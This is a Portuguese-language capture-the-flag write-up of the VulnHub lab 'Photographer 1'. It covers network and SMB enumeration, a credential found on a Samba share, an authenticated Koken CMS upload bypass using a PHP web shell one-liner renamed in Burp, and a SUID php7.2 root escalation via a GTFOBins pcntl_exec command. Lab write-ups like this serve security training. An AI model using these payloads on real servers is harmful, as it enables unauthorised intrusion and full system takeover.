---
title: "VulnHub - Photographer 1"
tags: [Linux,Easy,Web,Gobuster,BurpSuite,Linpeas]
categories: VulnHub OSCP
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-photographer1/inicial.png)

Link: [Photographer 1](https://www.vulnhub.com/entry/photographer-1,519/)

# Enumeração

## Primeiro passo é rodar o arp-scan para detectarmos os hosts

```bash
arp-scan -I eth1 192.168.56.0/24
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-photographer1/arp.png)

## Segundo passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-photographer1/nmap.png)

Full ports scan

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-photographer1/nmap1.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

> -T5 --> Modo insano

### Verificamos que temos 4 portas abertas no servidor

> Portas 80 e 8000 -> Web

> Portas 139 e 445 -> Samba

## Enumeração da Porta 445

Verificamos o que temos de shares no servidor

```bash
smbclient -L \\192.168.56.142
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-photographer1/smb.png)

Agora verificamos que temos uma pasta acessível

```bash
smbclient //192.168.56.142/sambashare
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-photographer1/smb1.png)

Baixamos os arquivos dela para análise

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-photographer1/smb2.png)

Lemos o arquivo e parece ser um e-mail enviado para um usuário

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-photographer1/smb3.png)

## Enumeração da Porta 80

Abrimos ela pra ver do que se trata

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-photographer1/web.png)

Rodamos o Gobuster

```bash
gobuster dir -u http://192.168.56.142 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 30
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-photographer1/gobuster.png)

Aqui não tivemos muitos resultados

## Enumeração da Porta 8000

Abrimos ela pra ver do que se trata

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-photographer1/web1.png)

Rodamos o Gobuster

```bash
gobuster dir -u http://192.168.56.142:8000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 30
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-photographer1/gobuster1.png)

Não cosneguimos fazer o fuzzing pela resposta do site não ser palpável pro Gobuster, podemos fazer isso com o wfuzz, mas não há necessidade nessa máquina

Dentro do site encontramos um arquivo interessante chamado shell.php

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-photographer1/web2.png)

## Koken CMS

Pelo que parece é um `Koken CMS`, procuramos por vulnerabilidades dele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-photographer1/web3.png)

Achamos uma que tem que ser autenticado, então vamos ter que fazer algum tipo de brute force no usuário, encontramos o local de login e do arquivo exfiltrado do samba temos o login

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-photographer1/web4.png)

A senha... vendo aquele arquivo exfiltrado pode ser `babygirl`, testamos e conseguimos acesso

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-photographer1/web5.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-photographer1/web6.png)

Agora verificamos no exploit como fazemos esse upload

1. Criar um php malicioso

```php
<?php system($_GET['cmd']);?>
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-photographer1/exp.png)

2. Salve como "image.php.jpg"

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-photographer1/exp1.png)

3. Após fazer o login, vá até o Dashboard do CMS, faça o upload do arquivo em "Import Content" e envie a requisição para o Burp

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-photographer1/exp2.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-photographer1/exp3.png)

4. No Burp, renomeie seu arquivo para "image.php"

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-photographer1/exp4.png)

Envie a requisição

5. Na Biblioteca do Koken, selecione seu arquivo e clique com o mouse em "Download File" para ver onde o arquivo está hospeado no servidor

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-photographer1/exp5.png)

Pronto. Agora é testar o RCE

Ai está!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-photographer1/exp6.png)

Agora é só pegar um reverse shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-photographer1/exp7.png)

Pegamos a flag de user

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-photographer1/flag.png)

# www-data -> root

Rodamos o linpeas para procurar por pontos de escalação de privilégio

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-photographer1/lin.png)

Passamos pra nossa máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-photographer1/lin1.png)

Passamos para a máquina virtual e executamos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-photographer1/lin2.png)

Apareceu que o `php7.2` está com o `SUID` habilitado

Também encontramos procurando por arquivos com SUID habilitado por esse comando

```bash
find / -perm -4000 2>/dev/null
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-photographer1/ee.png)

O `php2.7` está com essas permissões habilitadas, pesquisamos como explorar isso

https://gtfobins.github.io/gtfobins/php/

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-photographer1/ee1.png)

```
sudo install -m =xs $(which php) .

CMD="/bin/sh"
./php -r "pcntl_exec('/bin/sh', ['-p']);"
```

Então, viramos root!

```bash
php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-photographer1/ee2.png)

Pegamos a flag de root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-photographer1/flag1.png)